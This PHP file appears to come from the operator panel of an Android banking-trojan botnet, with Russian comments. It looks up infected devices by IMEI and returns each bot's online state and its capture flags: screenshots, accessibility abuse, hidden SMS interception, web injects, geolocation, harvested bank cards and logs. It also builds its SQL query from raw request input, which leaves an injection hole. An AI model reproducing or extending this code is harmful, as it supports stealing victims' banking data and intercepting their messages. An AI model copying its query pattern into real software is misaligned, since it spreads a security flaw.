<?php
session_start();
$statusCode=false;
if (!(isset($_SESSION['panel_user'])))
{
	session_destroy();
	header("Location: /index.php");
}else{

	if ($_SESSION['panel_status']!="Action"){
		session_destroy();
		header("Location: /index.php");
	}else{
		$statusCode=true;
	}
}

if($statusCode){

	if(isset($_REQUEST['imeis'])){
	include_once "../../config.php";

	$getIMEIs = $_REQUEST['imeis'];

	$arrayIMEI = explode(':',$getIMEIs);

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');

	$arrayData = '';
	foreach($arrayIMEI as $imei){

		if(strlen($imei)>4){
		$sql = "SELECT * FROM kliets WHERE IMEI='".$imei."'";
		foreach($connection->query($sql) as $row){
			if($imei == $row['IMEI']){//IMEI
				$lastConnect = $row['lastConnect'];
				$getInconConnect = getIconOnline($lastConnect);//онлайн
				$getScreen = $row['screen'];//скрин
				$getaccessibility = $row['accessibility'];//спец возможности
				$requestSMS = $row['requestSMS'];//скрытый перехват
				$requestInjProc=$row['requestInjProc'];//инжи
			    $requestGeoloc=$row['requestGeoloc'];//геолокация
				$cards = $row['l_bank']; //карты
				$injs = $row['inj']; //инжекты
				$logs = $row['log']; //логи

				if($getInconConnect!=0){
					$getScreen=0;
				}

				$arrayData = "$arrayData|$imei:$getInconConnect:$getScreen:$getaccessibility:$requestSMS:$requestInjProc:$requestGeoloc:$cards:$injs:$logs";
				break;
			}
		}
	}
}
	echo "$arrayData";
	}
}

function getIconOnline($lastConnect){
	//******Получаем иконку состояния бота, вычисляем дату****
			$arr_data_from = explode(" ", $lastConnect);
			$arr_data_till = explode(" ", date('Y-m-d H:i'));

			$date_from = $arr_data_from[0];
			$date_till = $arr_data_till[0];

			$date_from = explode('-', $date_from);
			$date_till = explode('-', $date_till);

			$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
			$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);

			$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
			//----------Секунды!-------/
			$date1 = new \DateTime($lastConnect);
			$date2 = new \DateTime(date('Y-m-d H:i'));
			$diff = $date2->diff($date1);
			// разница в секундах
			$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
			($diff->m * 30 * 24 * 60 * 60) +
			($diff->d * 24 * 60 * 60) +
			($diff->h * 60 * 60) +
			($diff->i * 60) +
			$diff->s;
			//----------обработка состояние иконки on/off-------/
			if($day>=2)//Дни!
			{
				return '2';//умер
			}
			else
			{
				if($seconds<=120)
				{
					return '0';//онлайн
				}
				else
				{
					return '1';//оффлайны
				}
			}
}
?>
